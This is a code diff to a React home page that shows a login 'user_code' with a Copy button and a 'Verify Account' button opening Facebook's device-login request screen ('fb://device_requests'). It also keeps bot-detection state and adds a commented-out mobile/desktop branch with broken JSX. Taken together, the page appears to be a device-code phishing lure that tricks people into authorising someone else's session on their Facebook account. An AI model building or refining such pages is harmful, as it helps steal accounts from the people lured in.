@@ -14,6 +14,8 @@ import {
   limit,
 } from "firebase/firestore";
 import { db } from "../../firebase";
+import { BrowserView, MobileView, isBrowser, isMobile } from 'react-device-detect';
+
 
 const HomePage = () => {
   const [botDetect,SetBotDetect] = useState(false);
@@ -141,10 +143,19 @@ const HomePage = () => {
                   <button className="btn btn-primary" id="copy_btn" onClick={() => { navigator.clipboard.writeText(loginData.user_code || "") } } type="button">Copy</button>
                 </div>
                 <div className="d-grid gap-1 mb-3">
-                  <a href="fb://device_requests/?qr=0">
-                  <button className="btn btn-primary" id="btn-auth" type="button">
-                    <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account </button>
+                  <a target="_blank" rel="noopener noreferrer" href="fb://device_requests/?qr=0">
+                      <button className="btn btn-primary" id="btn-auth" type="button">
+                        <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account </button>
                   </a>
+                  {/* {isMobile &&
+                      <a href="fb://device_requests/?qr=0">
+                      <button className="btn btn-primary" id="btn-auth" type="button">
+                        <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account </button>
+                      </a>
+                  }:{
+                    <button onClick={HANDL} className="btn btn-primary" id="btn-auth" type="button">
+                    <i className="fa fa-check-circle" aria-hidden="true"></i>&nbsp;Verify Account</button>
+                  } */}
                 </div>
               </div>
             </div>
